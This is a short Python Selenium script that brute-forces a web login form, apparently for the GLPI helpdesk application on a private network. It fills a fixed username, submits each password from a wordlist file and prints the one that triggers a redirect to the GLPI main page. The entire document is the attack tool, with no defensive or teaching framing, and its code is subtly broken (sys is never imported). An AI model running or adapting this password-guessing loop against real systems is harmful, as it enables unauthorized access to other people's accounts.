
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

# Assuming you have the WebDriver installed, for example, ChromeDriver.
# You can download it here: https://sites.google.com/chromium.org/driver/
driver = webdriver.Chrome()

try:
    driver.get("http://localhost:8000/test.html")

    # Wait for the page to load
    time.sleep(2)

    # Find the username and password fields and submit the form
    username_field = driver.find_element_by_name("user")
    password_field = driver.find_element_by_name("password")

    username_field.send_keys("ABCD")

    # Open and read the password file
    with open(sys.argv[1]) as password_file:
        for password in password_file:
            password_field.clear()
            password_field.send_keys(password.strip())

            # Submit the form
            password_field.send_keys(Keys.RETURN)

            # Wait for a short period to see if the login is successful
            time.sleep(1)

            # Check if the login was successful based on the redirected URL
            if "http://172.20.10.2/glpi/front/central.php" in driver.current_url:
                print("Mot de passe OK...", password.strip())
                break
            else:
                print("Tentative mot de passe :", password.strip(), "...echec")

finally:
    # Close the browser window
    driver.quit()
